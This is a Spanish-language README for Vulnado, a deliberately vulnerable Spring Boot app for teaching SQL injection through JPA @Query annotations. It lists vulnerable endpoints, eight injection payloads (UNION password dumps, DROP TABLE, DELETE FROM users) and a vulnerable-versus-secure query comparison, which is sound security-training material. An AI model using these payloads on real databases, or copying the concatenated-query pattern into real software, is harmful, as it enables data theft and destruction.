# Vulnado - Spring Boot Vulnerable Application with @Query SQL Injection

Esta es una versión mejorada de la aplicación Vulnado que incluye múltiples vulnerabilidades de SQL injection implementadas usando anotaciones `@Query` de Spring Data JPA.

## Nuevas Vulnerabilidades Agregadas

### 1. Repositorios con @Query Vulnerables

#### UserRepository

- `authenticateUserVulnerable()` - Autenticación vulnerable
- `searchUsersByNameVulnerable()` - Búsqueda de usuarios vulnerable
- `findByIdVulnerable()` - Búsqueda por ID vulnerable
- `findActiveUsersVulnerable()` - Filtro con ORDER BY vulnerable
- `findUsersByMultipleConditionsVulnerable()` - Condiciones múltiples vulnerables
- `getUserWithUnionVulnerable()` - UNION-based SQL injection
- `countUsersByConditionVulnerable()` - Conteo con condición dinámica vulnerable

#### CommentRepository

- `findCommentsByUserVulnerable()` - Búsqueda por usuario vulnerable
- `searchCommentsVulnerable()` - Búsqueda de contenido vulnerable
- `findRecentCommentsVulnerable()` - Filtros de fecha vulnerables
- `getCommentStatsVulnerable()` - Estadísticas con condición vulnerable
- `getCommentsWithUserInfoVulnerable()` - UNION con información de usuario
- `deleteCommentsByConditionVulnerable()` - Eliminación masiva vulnerable
- `updateCommentsByUserVulnerable()` - Actualización masiva vulnerable
- `findCommentsByUserConditionVulnerable()` - Subconsultas vulnerables
- `getTopCommentsVulnerable()` - LIMIT dinámico vulnerable
- `getCommentsWithUserDetailsVulnerable()` - JOINs complejos vulnerables

### 2. Nuevos Endpoints Vulnerables

#### VulnerableQueriesController (`/api/vulnerable/`)

- `GET /users/search?term=PAYLOAD` - Búsqueda de usuarios
- `POST /login/advanced` - Autenticación avanzada
- `GET /users/active?since=DATE&orderBy=PAYLOAD` - Usuarios activos
- `GET /users/complex-search?username=USER&userIds=PAYLOAD` - Búsqueda compleja
- `GET /users/stats?condition=PAYLOAD` - Estadísticas dinámicas
- `GET /comments/search?term=PAYLOAD` - Búsqueda de comentarios
- `GET /comments/recent?since=DATE&users=PAYLOAD&orderBy=PAYLOAD` - Comentarios recientes
- `GET /comments/stats?condition=PAYLOAD` - Estadísticas de comentarios
- `GET /comments/user-info?username=USER` - Información combinada
- `GET /comments/top?username=USER&limit=PAYLOAD` - Top comentarios
- `GET /comments/advanced-search?keyword=PAYLOAD&username=USER&sort=PAYLOAD` - Búsqueda avanzada
- `DELETE /comments/bulk-delete?condition=PAYLOAD` - Eliminación masiva
- `PUT /comments/bulk-update` - Actualización masiva
- `GET /users/union-search?username=USER&fakeUser=PAYLOAD&fakePassword=PAYLOAD` - UNION search

#### SQLInjectionDemoController (`/api/demo/`)

- `GET /users/search?term=PAYLOAD` - Demo de búsqueda vulnerable
- `GET /users/union-demo?username=USER&fakeUser=PAYLOAD&fakePassword=PAYLOAD` - Demo UNION injection
- `GET /users/order-demo?since=DATE&orderBy=PAYLOAD` - Demo ORDER BY injection
- `GET /comments/condition-demo?condition=PAYLOAD` - Demo condición WHERE vulnerable
- `GET /comments/subquery-demo?userCondition=PAYLOAD` - Demo subconsulta vulnerable
- `GET /vulnerabilities` - Información sobre todas las vulnerabilidades

## Ejemplos de Payloads de SQL Injection

### 1. Basic OR Injection

```
term=admin' OR '1'='1
```

### 2. UNION-based Injection

```
term=' UNION SELECT user_id, password, username FROM users --
```

### 3. Comment Out Attack

```
term=admin'; DROP TABLE comments; --
```

### 4. Boolean-based Blind Injection

```
term=admin' AND (SELECT COUNT(*) FROM users) > 0 --
```

### 5. ORDER BY Injection

```
orderBy=username; DROP TABLE comments; --
```

### 6. Subquery Injection

```
userCondition=username='admin') OR (SELECT COUNT(*) FROM comments) > 0 --
```

### 7. LIMIT Injection

```
limit=1; DELETE FROM users WHERE username='admin'; --
```

### 8. Condition Injection

```
condition=1=1) OR (SELECT COUNT(*) FROM users WHERE password LIKE '%admin%') > 0 --
```

## Configuración de la Base de Datos

El proyecto usa PostgreSQL. Asegúrate de configurar las siguientes variables de entorno:

```bash
PGHOST=localhost
PGDATABASE=vulnado
PGUSER=postgres
PGPASSWORD=password
```

## Ejecución

1. Instalar PostgreSQL
2. Configurar las variables de entorno
3. Ejecutar la aplicación:

```bash
./mvnw spring-boot:run
```

## Endpoints de Testing

### Vulnerabilidades Originales

- `POST /login` - Login vulnerable original
- `GET /comments` - Listar comentarios
- `POST /comments` - Crear comentario
- `DELETE /comments/{id}` - Eliminar comentario

### Nuevas Vulnerabilidades con @Query

- `GET /api/vulnerable/*` - Endpoints vulnerables usando repositorios JPA
- `GET /api/demo/*` - Endpoints de demostración con ejemplos

## Propósito Educativo

Esta aplicación está diseñada exclusivamente para:

- Educación en seguridad de aplicaciones
- Testing de herramientas de análisis de código
- Práctica de pentesting ético
- Demostración de vulnerabilidades de SQL injection

**⚠️ ADVERTENCIA: NO usar en producción. Esta aplicación contiene vulnerabilidades intencionales.**

## Tipos de Vulnerabilidades Implementadas

1. **String Concatenation in @Query** - Concatenación directa de parámetros
2. **SpEL Injection** - Uso inseguro de Spring Expression Language
3. **Dynamic Query Construction** - Construcción dinámica de consultas
4. **UNION-based Injection** - Inyección usando UNION SELECT
5. **ORDER BY Injection** - Inyección en cláusulas ORDER BY
6. **WHERE Condition Injection** - Inyección en condiciones WHERE
7. **Subquery Injection** - Inyección en subconsultas
8. **LIMIT/OFFSET Injection** - Inyección en límites de consulta
9. **JOIN Injection** - Inyección en cláusulas JOIN
10. **Bulk Operations Injection** - Inyección en operaciones masivas

## Comparación: Consultas Vulnerables vs Seguras

El proyecto incluye tanto consultas vulnerables como sus equivalentes seguros para fines educativos y de comparación.

### Ejemplo Vulnerable:

```java
@Query(value = "SELECT * FROM users WHERE username = '" +
               ":#{#username}" + "'", nativeQuery = true)
Optional<User> findUserVulnerable(@Param("username") String username);
```

### Ejemplo Seguro:

```java
@Query("SELECT u FROM User u WHERE u.username = :username")
Optional<User> findUserSecure(@Param("username") String username);
```
